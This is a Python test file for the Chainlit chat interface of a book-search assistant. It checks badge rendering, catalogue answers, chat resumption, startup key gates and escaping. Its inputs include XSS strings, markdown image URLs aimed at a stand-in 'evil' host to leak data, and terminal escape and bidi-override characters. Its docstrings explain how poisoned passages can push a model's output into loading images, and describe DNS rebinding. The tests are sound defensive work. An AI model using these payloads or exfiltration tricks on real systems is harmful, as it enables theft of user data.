"""UI rendering contracts that do not need a running Chainlit server.
Skipped when the ui extra is not installed (a plain `uv sync` clone)."""
import asyncio
import importlib
import json
import logging
import os
import stat
import subprocess
import sys
import tomllib
from pathlib import Path

import pytest
from conftest import REPO, fresh_output as _out, run_fresh as _run

pytest.importorskip("chainlit")

from ask_your_library.sanitize import LINE_BREAK_RE      # noqa: E402  (after the skip)

# The Chainlit application, now inside the package (#30). Imported by name
# rather than as a module of the checkout: `chainlit run` still loads the file
# as a top-level `app`, but this suite imports the installed package, which is
# what an installation actually has.
UI_MODULE = "ask_your_library.ui.app"

# A blank line ends the HTML block a message is; CommonMark ends a line on more
# than LF, so every one of these opens the same hole in a badge or a footer.
BLANK_LINES = ("\n\n", "\r\r", "\r\n\r\n", "\u2028\u2028", "\x85\x85")


@pytest.fixture(autouse=True)
def hosted_backend(monkeypatch):
    """app.py's startup gate asks preflight, which read the backend from the
    environment once, at import time: a developer whose shell (or .env) says
    LLM_BACKEND=ollama would otherwise test a server whose key gate is off.
    Every test here describes the default backend, except the local-mode one,
    which pins it the other way."""
    monkeypatch.setattr("ask_your_library.preflight.OPENROUTER_NEEDS_KEY", True)


@pytest.fixture
def ui(monkeypatch, tmp_path):
    # app.py refuses the placeholder password unless the demo login is acknowledged,
    # refuses to start without an OpenRouter key, mints a secret file on import and
    # creates the chat db: all of that goes to tmp, never to the checkout's .chainlit/.
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    sys.modules.pop(UI_MODULE, None)
    module = importlib.import_module(UI_MODULE)
    monkeypatch.setattr(module.cl, "run_sync", lambda value: value)
    return module


def test_reflect_step_shows_the_real_stop_reason(ui, monkeypatch):
    shown = []
    monkeypatch.setattr(ui, "show_step",
                        lambda name, text, default_open=False: shown.append((name, text, default_open)))
    ui.render_event("reflect", {"current_query": "", "stop_reason": "step limit (5) — wanted to keep searching"})
    from ask_your_library.i18n import t as _t
    # the label is the product's own sentence, and the LAST reflect — the one
    # that says why the search stopped — opens by itself
    assert shown[-1] == (_t("ui_step_reflect"), shown[-1][1], True)
    assert "step limit" in shown[-1][1]
    ui.render_event("reflect", {"current_query": ""})
    assert "enough" in shown[-1][1]                     # legacy fallback when no reason is given
    ui.render_event("reflect", {"current_query": "more whales"})
    assert "more whales" in shown[-1][1] and shown[-1][2] is False   # still searching: collapsed
    # The web UI's line adds "stopped: " the same way the CLI's does, so a reason
    # that carried the word itself was printed twice here too.
    from ask_your_library.i18n import t
    ui.render_event("reflect", {"current_query": "", "stop_reason": t("stop_chapter_again")})
    assert shown[-1][1].count("stopped:") == 1


def test_badge_is_green_only_when_nothing_is_broken_or_unattributed(ui):
    def badge(**numbers):
        return ui.verification_badge({"verification": "v", "provenance": numbers})

    assert ui.GREEN in badge(checked=3, confirmed=3, broken=0, unattributed=0)
    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=0, unattributed=1)
    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=1, unattributed=0, broken_items=[])
    assert ui.GRAY in badge(checked=0, confirmed=0, broken=0, unattributed=0)


def test_the_badge_names_the_quotes_the_gate_dropped_before_the_answer(ui):
    """#29: the counts above are what the answer rests on; this line is what it
    was not allowed to rest on. It matters most under the grey "no evidence"
    badge, where the dropped quotes are the whole story of the refusal — and it
    is absent from a record written before the gate, which dropped nothing."""
    def badge(**numbers):
        return ui.verification_badge({"verification": "v", "provenance": numbers})

    green = badge(checked=2, checked_book_text=2, confirmed=2, broken=0, unattributed=0,
                  dropped_unverified=3)
    assert ui.GREEN in green and "2/2 traced to their source" in green
    assert "3 quotes dropped before the answer" in green

    refused = badge(checked=0, confirmed=0, broken=0, unattributed=0, dropped_unverified=1)
    assert ui.GRAY in refused and "1 quotes dropped before the answer" in refused

    assert "dropped before the answer" not in badge(checked=2, confirmed=2, broken=0, unattributed=0)


def test_the_headline_count_never_includes_a_quote_that_only_matched_a_card(ui):
    """The badge's "n/n traced to their source" is about the BOOK's own text. A
    quote whose only match is a book card is a model's summary, so it is
    reported under the count and never inside it (design critique 16.09 §1.1)."""
    def badge(**numbers):
        return ui.verification_badge({"verification": "v", "provenance": numbers})

    green = badge(checked=4, checked_book_text=2, confirmed=2, broken=0, unattributed=0, card_only=2)
    assert ui.GREEN in green and "2/2 traced to their source" in green
    assert "4/4" not in green and "2/4" not in green
    assert "+2 matched only a book card" in green

    # nothing at all traced to the book: amber, and it says so instead of 0/0
    only_cards = badge(checked=2, checked_book_text=0, confirmed=0, broken=0, unattributed=0, card_only=2)
    assert ui.YELLOW in only_cards and "nothing traced to the book text: all 2" in only_cards
    assert "0/0" not in only_cards
    # and the sentence is not printed twice
    assert only_cards.count("book card") == 1

    # a record from before the split reads exactly as it read then
    assert "3/3 traced to their source" in badge(checked=3, confirmed=3, broken=0, unattributed=0)


def test_a_catalogue_answer_is_one_step_and_the_titles_render_as_text(ui, monkeypatch):
    shown, sent = [], []
    monkeypatch.setattr(ui, "show_step",
                        lambda name, text, default_open=False: shown.append((name, text, default_open)))

    class Msg:
        def __init__(self, content, metadata=None):
            sent.append((content, metadata))

        def send(self):
            return None

    monkeypatch.setattr(ui.cl, "Message", Msg)
    ui.render_event("plan", {"mode": "catalog", "catalog_request": {"op": "list", "title": "", "author": ""},
                             "current_query": "", "queries": []})
    from ask_your_library.i18n import t as _t
    assert shown[-1][0] == _t("ui_step_plan") and shown[-1][2] is True      # plan opens by itself
    assert "operation: list" in shown[-1][1] and "search queries" not in shown[-1][1]
    ui.render_event("catalog", {"answer": "2 books:\n- <b>Moby Dick</b> — Herman Melville",
                                "catalog": {"op": "list", "count": 2, "total": 2, "books": ["x", "y"],
                                            "query": "", "resolved": True, "suggestions": []},
                                "stop_reason": "catalog"})
    assert shown[-1] == (_t("ui_step_catalog"), "list: 2 of 2 books, from the index tables", False)
    content, metadata = sent[-1]
    assert "&lt;b&gt;Moby Dick&lt;/b&gt;" in content                   # a crafted title is text, not DOM
    assert metadata == {"catalog": {"op": "list", "count": 2, "total": 2, "query": "", "resolved": True}}
    assert "books" not in metadata["catalog"]                          # the shape rides along, never the list
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [],
                             "book_filter": "Moby Dick — Herman Melville", "book_unresolved": ""})
    assert "retrieval limited to it" in shown[-1][1]


def test_a_refused_request_renders_as_one_plan_step_with_no_query_list(ui, monkeypatch):
    """The gate's plan step (#70): what happened, not an empty query list."""
    shown = []
    monkeypatch.setattr(ui, "show_step",
                        lambda name, text, default_open=False: shown.append((name, text, default_open)))
    from ask_your_library.i18n import t as _t
    ui.render_event("plan", {"mode": "refusal", "current_query": "", "queries": [],
                             "book_filter": "", "book_unresolved": ""})
    name, text, opened = shown[-1]
    assert name == _t("ui_step_plan") and opened is True
    assert text == _t("ui_plan_refusal")
    assert _t("ui_queries") not in text and _t("ui_mode", mode="refusal") not in text


def test_plan_step_book_names_are_escaped_by_the_real_step_writer(ui, monkeypatch):
    """show_step itself, not a pass-through: a crafted book name in the plan
    step is text, not DOM."""
    import asyncio
    outputs = []

    class Step:
        def __init__(self, name, type=None, default_open=False):
            self.name, self.output, self.default_open = name, "", default_open

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            outputs.append((self.name, self.output))
            return False

    monkeypatch.setattr(ui.cl, "Step", Step)
    monkeypatch.setattr(ui.cl, "run_sync", lambda coro: asyncio.run(coro))
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [],
                             "book_filter": "<img src=x onerror=alert(1)> — Nobody", "book_unresolved": ""})
    name, output = outputs[-1]
    from ask_your_library.i18n import t as _t
    assert name == _t("ui_step_plan") and "&lt;img src=x onerror=alert(1)&gt;" in output
    assert "<img" not in output


def test_the_badge_of_a_catalogue_answer_is_green_and_names_the_source(ui):
    badge = ui.verification_badge({"verification": "v", "provenance": {
        "checked": 0, "confirmed": 0, "broken": 0, "unattributed": 0,
        "catalog": {"op": "count", "count": 33, "total": 33}}})
    assert ui.GREEN in badge and "Catalogue answer" in badge and "33 of 33 books" in badge
    assert "Quote provenance" not in badge


class FakeSession:
    """cl.user_session outside a Chainlit context: a dict with get/set."""

    def __init__(self):
        self.values = {}

    def get(self, key, default=None):
        return self.values.get(key, default)

    def set(self, key, value):
        self.values[key] = value


def _resumed_history(ui, monkeypatch, thread):
    import asyncio
    session = FakeSession()
    monkeypatch.setattr(ui.cl, "user_session", session)
    asyncio.run(ui.on_chat_resume(thread))
    return session.get("history")


def test_a_resumed_chat_remembers_a_catalogue_answer_by_its_shape_only(ui, monkeypatch):
    """on_chat_resume rebuilds the conversation memory from the persisted steps;
    the catalogue message's metadata (a dict, or the JSON string SQLite hands
    back) keeps the titles out of it, and an ordinary answer stays as text."""
    shape = {"op": "list", "count": 2, "total": 2, "query": "", "resolved": True}
    listing = "2 books in your library (by the index tables):\n- Private Book — Someone\n- Other — Else"
    thread = {"metadata": {"chat_profile": ui.PROFILE_EN}, "steps": [
        {"type": "user_message", "output": "what are my books called?"},
        {"type": "assistant_message", "output": listing, "metadata": {"catalog": shape}},
        {"type": "user_message", "output": "and by author?"},
        {"type": "assistant_message", "output": listing, "metadata": json.dumps({"catalog": shape})},
        {"type": "user_message", "output": "who narrates Moby Dick?"},
        {"type": "assistant_message", "output": "Ishmael [Moby Dick, Chapter 1].", "metadata": "{}"},
    ]}
    history = _resumed_history(ui, monkeypatch, thread)
    assert len(history) == 3
    for entry in history[:2]:
        assert "catalogue answer: list, 2 of 2 books" in entry
        assert "Private Book" not in entry and "Other — Else" not in entry
    assert history[2] == "Q: who narrates Moby Dick?\nA: Ishmael [Moby Dick, Chapter 1]."


def test_a_resumed_chat_puts_the_answer_back_into_the_memory_unescaped(ui, monkeypatch):
    """The persisted answer was escaped for the browser at write time
    (html.escape in render_event); the conversation memory is a prompt, not a
    page. Without unescaping, the next planner and synthesize call read
    "Sense &amp; Sensibility" and "&lt;note&gt;" as the previous turn."""
    answer = "Ishmael &amp; Queequeg [&lt;Moby Dick&gt;, Chapter 1]."
    thread = {"metadata": {"chat_profile": ui.PROFILE_EN}, "steps": [
        {"type": "user_message", "output": "who narrates it?"},
        {"type": "assistant_message", "output": answer, "metadata": "{}"},
    ]}
    history = _resumed_history(ui, monkeypatch, thread)
    assert history == ["Q: who narrates it?\nA: Ishmael & Queequeg [<Moby Dick>, Chapter 1]."]


def test_the_catalogue_shape_survives_the_data_layer_round_trip(ui, monkeypatch):
    """The real persistence: the message is written through the app's data
    layer into the app's schema and read back with get_thread, then the resume
    handler rebuilds the memory from what came back."""
    import asyncio
    layer = ui.data_layer()
    shape = {"op": "has", "count": 1, "total": 33, "query": "Dracula", "resolved": True}

    # create_step is wrapped by a decorator that queues writes until a live
    # session's first user message; the write itself (the INSERT with the
    # metadata serialized) is what this test exercises, through __wrapped__.
    write_step = type(layer).create_step.__wrapped__

    async def persist_and_read():
        try:
            await layer.update_thread(thread_id="t1", name="do I have Dracula?", metadata={"chat_profile": ui.PROFILE_EN})
            base = {"threadId": "t1", "streaming": False}
            await write_step(layer, {**base, "id": "s1", "name": "admin", "type": "user_message",
                                     "output": "do I have Dracula?", "createdAt": "2026-09-08T20:00:00Z"})
            await write_step(layer, {**base, "id": "s2", "name": "Ask Your Library", "type": "assistant_message",
                                     "output": "Yes, in your library:\n- Dracula — Bram Stoker",
                                     "metadata": {"catalog": shape}, "createdAt": "2026-09-08T20:00:01Z"})
            return await layer.get_thread("t1")
        finally:
            await layer.close()

    thread = asyncio.run(persist_and_read())
    assert thread is not None and len(thread["steps"]) == 2
    history = _resumed_history(ui, monkeypatch, thread)
    assert history == ["Q: do I have Dracula?\nA: (catalogue answer: has, 1 of 33 books; asked about: Dracula, "
                       "found: yes; the list of titles is not kept in the conversation)"]
    assert "Bram Stoker" not in history[0]


def test_ui_import_writes_only_into_its_configured_dir(ui, tmp_path):
    assert (tmp_path / "chainlit" / "chat.db").exists()
    assert ui.CHAINLIT_DIR == tmp_path / "chainlit"


def test_markdown_images_are_neutralized_but_links_survive(ui):
    text = "See ![pixel](https://evil.example/p?d=leak) and [the book](https://example.org/x)"
    out = ui.neutralize_markdown(text)
    # The whole result, not a search for host names inside it: a substring test
    # against a URL reads as an allow-list check and is not one here. The image
    # construct leaves with its URL; the ordinary link is returned untouched.
    assert out == "See [image removed] and [the book](https://example.org/x)"
    ref = "see ![pixel][x] here\n\n[x]: https://evil.example/p?d=leak"
    out = ui.neutralize_markdown(ref)
    assert "![" not in out and "[pixel][x]" in out          # demoted to a link, never an image
    assert "![" not in ui.neutralize_markdown("![a ![b](u)](v)")


def test_empty_password_refuses_to_start(monkeypatch, tmp_path):
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    monkeypatch.setenv("CHAINLIT_PASSWORD", "")
    sys.modules.pop(UI_MODULE, None)
    with pytest.raises(SystemExit):
        importlib.import_module(UI_MODULE)
    sys.modules.pop(UI_MODULE, None)


def test_missing_key_refuses_to_start_before_anyone_logs_in(monkeypatch, tmp_path):
    """The preflight in on_chat_start only speaks to a user who is already
    logged in; a keyless server must refuse at startup instead."""
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_ENV_FILE", raising=False)
    # config.OPENROUTER_ENV_FILE was resolved at import time; the key lookup must
    # find nothing whatever the developer running the tests has configured.
    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", None)
    sys.modules.pop(UI_MODULE, None)
    with pytest.raises(SystemExit) as exit_info:
        importlib.import_module(UI_MODULE)
    sys.modules.pop(UI_MODULE, None)
    message = str(exit_info.value)
    assert "OPENROUTER_API_KEY" in message and "AYL_ALLOW_START_WITHOUT_KEY" in message

    # ...and the escape hatch really is the only thing standing in the way.
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    sys.modules.pop(UI_MODULE, None)
    assert importlib.import_module(UI_MODULE).CHAINLIT_DIR == tmp_path / "chainlit"
    sys.modules.pop(UI_MODULE, None)


def test_the_fully_local_mode_starts_with_no_key_at_all(tmp_path):
    """The mirror of the test above: LLM_BACKEND=ollama with local embeddings
    needs no OpenRouter account, so the same keyless server must come up —
    without the escape hatch, which is for importing app.py, not for serving.

    Driven by the environment in a subprocess, not by pinning the derived
    OPENROUTER_NEEDS_KEY: config resolves the backends once, at import time, so
    pinning the flag would test the gate against a value this test wrote itself
    and would survive config deciding the local mode needs a key after all."""
    chainlit_dir = tmp_path / "chainlit"
    code = f"import {UI_MODULE} as ui; print(ui.CHAINLIT_DIR)"
    # No key of any kind, and no AYL_ALLOW_START_WITHOUT_KEY: the backends alone
    # must carry the import past the gate. check=True => a SystemExit fails here.
    done = _run(code, LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
                CHAINLIT_AUTH_SECRET="test-secret", AYL_ALLOW_DEFAULT_LOGIN="1",
                AYL_CHAINLIT_DIR=str(chainlit_dir))
    assert done.stdout.strip() == str(chainlit_dir)


def test_a_key_from_the_env_file_alone_starts_the_server(monkeypatch, tmp_path, capsys):
    """The startup gate must accept the documented OPENROUTER_ENV_FILE route,
    not only an exported variable — and read that file once, without ever
    putting the key on screen."""
    key_file = tmp_path / "openrouter.env"
    secret = "test-key-value-0123456789"     # neutral: the snapshot guard rejects real key prefixes
    key_file.write_text(f'OPENROUTER_API_KEY="{secret}"\n')

    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    # No escape hatch and no exported key: the env file is the only way through.
    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    # config resolved OPENROUTER_ENV_FILE at import time, so point the lookup
    # at the tmp file the way the running process would have it.
    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", key_file)

    reads = []
    real_read_text = Path.read_text

    def counting_read_text(self, *args, **kwargs):
        if self == key_file:
            reads.append(self)
        return real_read_text(self, *args, **kwargs)
    monkeypatch.setattr(Path, "read_text", counting_read_text)

    sys.modules.pop(UI_MODULE, None)
    try:
        module = importlib.import_module(UI_MODULE)      # no SystemExit: the gate is satisfied
        assert module.CHAINLIT_DIR == tmp_path / "chainlit"
    finally:
        sys.modules.pop(UI_MODULE, None)

    assert len(reads) == 1, f"the key file was read {len(reads)} times, expected once"
    captured = capsys.readouterr()
    assert secret not in captured.out and secret not in captured.err

def test_partial_metrics_are_shown_but_not_added_to_the_session_cost(ui, monkeypatch):
    """A run paused at a clarify reports its cost so far; the final event covers
    the whole run, so only that one accumulates."""
    import asyncio

    store = {}
    monkeypatch.setattr(ui.cl, "user_session", type("S", (), {"get": staticmethod(lambda k: store.get(k)),
                                                             "set": staticmethod(lambda k, v: store.__setitem__(k, v))})())
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)
        async def send(self):
            return None
    monkeypatch.setattr(ui.cl, "Message", Msg)
    base = {"model": "m", "llm_calls": 3, "input_tokens": 10, "output_tokens": 2, "cache_read_tokens": 0,
            "by_role": {}, "hits_seen": 0, "evidence_distilled": 0, "redacted_lines": 0, "evidence_dropped_no_hit": 0}
    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.01, "seconds": 5, "steps_taken": 1, "partial": True}))
    assert store.get("session_cost") in (None, 0.0) and "so far" in sent[-1]
    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.03, "seconds": 9, "steps_taken": 2, "stop_reason": "enough"}))
    assert abs(store["session_cost"] - 0.03) < 1e-9 and "so far" not in sent[-1]


def test_plan_step_says_when_the_planner_fell_back_to_the_raw_question(ui, monkeypatch):
    from ask_your_library.i18n import t
    shown = []
    monkeypatch.setattr(ui, "show_step",
                        lambda name, text, default_open=False: shown.append((name, text, default_open)))
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": []})
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [], "plan_fallback": True})
    assert t("ui_plan_fallback") not in shown[0][1] and t("ui_plan_fallback") in shown[1][1]


def test_every_evidence_item_opens_on_the_passage_it_was_checked_against(ui, monkeypatch):
    """After the badge, one <details> per retrieved passage: book, section, hit id
    and verdict counts in the summary; every quote with its verdict inside, then the
    passage from the act events. Corpus text is escaped, image-free and carries no
    raw line break (a blank line would end the HTML block and spill the passage
    into the chat as markdown); a passage the run never showed says so."""
    from ask_your_library.i18n import t
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)
        async def send(self):
            return None
    monkeypatch.setattr(ui.cl, "Message", Msg)
    monkeypatch.setattr(ui, "show_step", lambda name, text: None)
    view = ui.RunView()
    passage = "## Plot\n\nCall me Ishmael. <script>alert(1)</script>\n\n- **Ahab** ![x](http://evil/x.png)"
    ui.render_event("act", {"steps_taken": 1, "hits": [], "hits_log": [{"hit_id": "s1h1", "text": passage}]}, view=view)
    ui.render_event("validate", {"verification": "OK", "provenance": {
        "checked": 3, "confirmed": 1, "unattributed": 0, "broken": 2, "unused": 0, "broken_items": [],
        "items": [{"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
                   "quote": "Call me Ishmael.", "status": "confirmed"},
                  {"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
                   "quote": "Ishmael was a lawyer.", "status": "broken"},
                  {"hit_id": "s9h9", "book": "B — A", "section": "s", "quote": "gone", "status": "broken"}]}}, view=view)
    assert len(sent) == 2                                    # the badge, then the evidence list
    block = sent[1]
    assert block.count("<details>") == 2                      # two passages for three items
    assert t("ui_evidence_title", n=3, p=2) in block
    assert f"{t('ev_status_confirmed')} 1" in block and f"{t('ev_status_broken')} 1" in block   # per-passage counts
    assert "<code>s1h1</code>" in block and "<q>Call me Ishmael.</q>" in block and "<q>Ishmael was a lawyer.</q>" in block
    assert "&lt;script&gt;" in block and "<script>" not in block and "![x]" not in block
    assert "\n" not in block and "<br><br>" in block          # no blank line can end the HTML block
    assert "## Plot" in block                                 # the heading text survives, as text
    # The passage is a div, not a pre: Chainlit renders a <pre> with its
    # code-snippet component ("Raw code" and a copy button) and the text inside
    # it never reaches the DOM, so the passage the badge points at was invisible
    # in the browser while sitting complete in chat.db.
    assert "<pre" not in block
    rendered_passage = block.split('<div style="white-space: pre-wrap;', 1)
    assert len(rendered_passage) == 2
    assert "Call me Ishmael." in rendered_passage[1].split("</div>", 1)[0]
    assert t("ui_passage_missing") in block                  # s9h9 was never in this run
    # views are per question and do not mix: a second view has no passages
    other = ui.RunView()
    ui.render_event("validate", {"verification": "OK", "provenance": {"items": [
        {"hit_id": "s1h1", "book": "b", "section": "s", "quote": "q", "status": "confirmed"}]}}, view=other)
    assert t("ui_passage_missing") in sent[-1] and "Call me Ishmael" not in sent[-1]


def test_the_matched_run_is_marked_inside_the_passage(ui):
    """The quote was printed above six lines of monospace and the reader was
    left to find it: the proof was on screen and unproven to the eye (design
    critique 16.09 §1.3). Every quote that really is inside the passage is
    marked where it sits, and one that is not is not marked anywhere."""
    passage = "Call me Ishmael. Some years ago I thought I would sail. It drove off the spleen."
    items = [{"hit_id": "s1h1", "book": "b", "section": "s", "status": "confirmed",
              "quote": "Some years ago I thought I would sail."},
             {"hit_id": "s1h1", "book": "b", "section": "s", "status": "broken",
              "quote": "Ishmael was a lawyer."}]
    block = ui.evidence_passages(items, {"s1h1": passage})
    assert block.count("<mark") == 1
    marked = block.split("<mark", 1)[1].split(">", 1)[1].split("</mark>", 1)[0]
    assert marked == "Some years ago I thought I would sail."
    # the rest of the passage is still there, once, around the mark
    assert "Call me Ishmael." in block and "It drove off the spleen." in block


def test_marking_a_passage_does_not_open_a_hole_in_the_escaping(ui):
    """The passage is cut into slices and each one goes through safe_html, so
    every rule the whole of it obeyed still holds: HTML is text, an image cannot
    be fetched on render, and no raw line break can end the HTML block."""
    passage = ("<script>alert(1)</script> quote me here now\n\n"
               "![x](http://evil/x.png) and <b>bold</b>")
    block = ui.evidence_passages(
        [{"hit_id": "s1h1", "book": "b", "section": "s", "status": "confirmed",
          "quote": "quote me here now"}], {"s1h1": passage})
    assert "<mark" in block and ">quote me here now<" in block
    assert "&lt;script&gt;" in block and "<script>" not in block
    assert "&lt;b&gt;" in block and "x.png" not in block and "[image removed]" in block
    assert "\n" not in block and "<br><br>" in block


def _summary(block: str, hit_id: str) -> str:
    """The <summary> line of one passage's <details> — the citation and the
    verdict counts, which is what a reader sees before opening anything."""
    piece = block.split(f"<code>{hit_id}</code>", 1)[1]
    return piece.split("</summary>", 1)[0]


def test_the_passage_summary_counts_card_matches_too(ui):
    """The verdict counts in a passage's summary are a partition of the quotes
    inside it. `card_only` was missing from the list they are built from, so a
    card-only passage showed no count at all after a dangling separator, and a
    mixed one counted one of its two quotes."""
    from ask_your_library.i18n import source_word, t

    def block(*statuses):
        items = [{"hit_id": "s1h1", "book": "Dracula — Bram Stoker", "section": "Key Takeaways",
                  "source_kind": "card", "status": status, "quote": f"quote {n}"}
                 for n, status in enumerate(statuses)]
        return ui.evidence_passages(items, {"s1h1": "quote 0 quote 1"})

    card_only = _summary(block("card_only", "card_only"), "s1h1")
    assert f"{t('ui_verdict_card_only')} 2" in card_only
    assert not card_only.rstrip().endswith("·")          # no separator with nothing after it
    assert source_word("card") in card_only

    mixed = _summary(block("confirmed", "card_only"), "s1h1")
    assert f"{t('ev_status_confirmed')} 1" in mixed and f"{t('ui_verdict_card_only')} 1" in mixed
    # the counts still add up to the quotes in the passage
    assert sum(int(part.rsplit(" ", 1)[1]) for part in mixed.split(" · ")[-2:]) == 2


def test_the_evidence_list_says_which_passages_are_book_cards(ui):
    """A reader who opens a bulleted distillate under a green badge had no way
    to tell it from a chapter. Each passage now names its kind, and a quote whose
    only match was a card says what that means in its own words."""
    from ask_your_library.i18n import source_word, t

    items = [{"hit_id": "s1h1", "book": "Dracula — Bram Stoker", "section": "Chapter 27",
              "quote": "crumbled into dust", "status": "confirmed", "source_kind": "book_text"},
             {"hit_id": "s1h2", "book": "Dracula — Bram Stoker", "section": "Key Takeaways",
              "quote": "The hunters chase the count", "status": "card_only", "source_kind": "card"}]
    block = ui.evidence_passages(items, {"s1h1": "crumbled into dust", "s1h2": "The hunters chase the count"})
    assert source_word("book_text") in block and source_word("card") in block
    assert t("ev_status_card_only") in block
    # an item from a record written before source_kind existed shows no label
    plain = ui.evidence_passages([{"hit_id": "s1h1", "book": "b", "section": "s", "quote": "q",
                                   "status": "confirmed"}], {"s1h1": "q"})
    assert source_word("book_text") not in plain and source_word("card") not in plain
    assert "<code>s1h1</code> · " in plain               # and no empty separator is left behind


def test_the_evidence_card_names_its_source_without_the_corpus_formatting_it(ui, monkeypatch,
                                                                             tmp_path):
    """The card's summary is the citation: book, section, hit id. Both names are
    index metadata, and the card only escapes HTML — a right-to-left override in
    a section title reverses the rendering of the very line that says where a
    quote came from, and an OSC sequence sits in chat.db for whoever reads it in
    a terminal. `act` strips both off the hit, so nothing arrives here."""
    from ask_your_library import nodes
    osc = "\x1b]0;pwned\x07"
    book, section = f"Moby Dick{osc} — Herman Melville", "Chapter ‮One"
    monkeypatch.setattr(nodes, "read_chapter",
                        lambda b, s, max_chars=12000: ("Call me Ishmael.", book, "found"))
    acted = nodes.act({"current_query": f"__chapter__|{book}|{section}", "steps_taken": 0,
                       "read_chapters": [], "scratchpad_path": str(tmp_path / "scratch.md")})
    hit = acted["hits"][0]
    items = [{"hit_id": hit["hit_id"], "book": hit["book"], "section": hit["section"],
              "quote": "Call me Ishmael.", "status": "confirmed"}]
    card = ui.evidence_passages(items, {hit["hit_id"]: acted["hits_log"][0]["text"]})
    for char in ("\x1b", "\x07", "‮"):
        assert char not in card
    assert "Moby Dick]0;pwned — Herman Melville — Chapter One" in card


def test_a_broken_quote_cannot_load_an_image_through_the_badge_tooltip(ui):
    """The badge's title attribute carried the verification text escaped and
    nothing more. That text is built around the quotes that failed, i.e. around
    corpus text: a blank line in it ends the message's HTML block, everything
    after it is chat markdown again, and an image reference there is fetched on
    render, with no click and no visible element. Confirmed in a browser
    before the fix. The whole badge must therefore hold no line break and no image.

    Every form of break, not only LF: CommonMark ends a block on a bare CR and
    on U+2028/U+0085 too, and only LF used to be normalized here."""
    for blank in BLANK_LINES:
        verification = ('WARNING: 1 of 1 quotes NOT found verbatim in any retrieved passage:\n'
                        '  - Poisoned Book — Chapter 1: "a quote"'
                        f'{blank}![p](http://x/y.png)')
        for numbers in ({}, {"checked": 0}, {"checked": 1, "confirmed": 0, "unattributed": 0,
                                             "broken": 1, "broken_items": []}):
            badge = ui.verification_badge({"verification": verification, "provenance": numbers})
            assert not LINE_BREAK_RE.search(badge), "a raw break ends the badge's HTML block"
            assert "![" not in badge and "y.png" not in badge
            assert "[image removed]" in badge


def test_a_hostile_stop_reason_cannot_load_an_image_through_the_metrics_footer(ui, monkeypatch):
    """The footer interpolates the stop reason, which reflect writes from the
    model's decision, and the model reads poisoned passages. Same shape as the
    badge tooltip: escaped is not enough, because a blank line ends the block."""
    store = {}
    session = type("S", (), {"get": staticmethod(lambda k: store.get(k)),
                             "set": staticmethod(lambda k, v: store.__setitem__(k, v))})()
    monkeypatch.setattr(ui.cl, "user_session", session)
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)

        async def send(self):
            return None
    monkeypatch.setattr(ui.cl, "Message", Msg)
    for blank in BLANK_LINES:
        asyncio.run(ui.show_metrics({
            "model": "m", "cost_usd": 0.01, "seconds": 1, "steps_taken": 1,
            "stop_reason": f"halt{blank}![p](http://x/y.png)", "llm_calls": 1,
            "input_tokens": 1, "output_tokens": 1, "cache_read_tokens": 0,
            "by_role": {}, "hits_seen": 0, "evidence_distilled": 0, "redacted_lines": 0}))
        assert not LINE_BREAK_RE.search(sent[-1])
        assert "![" not in sent[-1] and "y.png" not in sent[-1]
        assert "[image removed]" in sent[-1]


def test_a_foreign_host_header_is_refused(ui):
    """A page open in the reader's browser can reach a loopback server: the
    port is guessable, and a name that resolves to 127.0.0.1 (DNS rebinding)
    makes it same-origin for the browser. Without a Host check that page can
    POST the quick start's placeholder login and then read every thread. The
    check is registered on Chainlit's own app at import time (after the
    middleware stack is built it would be too late), and a second import must
    not stack copies of it."""
    from chainlit.server import app
    from starlette.middleware.trustedhost import TrustedHostMiddleware

    registered = [m for m in app.user_middleware if m.cls is TrustedHostMiddleware]
    assert len(registered) == 1
    # started with no --host, so the pair is the whole list; the bound host is
    # test_the_host_the_server_was_bound_to_answers_and_nothing_else_does
    assert registered[0].kwargs["allowed_hosts"] == ["localhost", "127.0.0.1"] == ui.ALLOWED_HOSTS
    assert app.middleware_stack is None, "the stack is already built: add_middleware came too late"


def test_the_host_the_server_was_bound_to_answers_and_nothing_else_does(tmp_path):
    """`ayl ui --host books.local` binds the interface the reader asked for, and
    the CLI's help says that serves the chat to the network. With the Host check
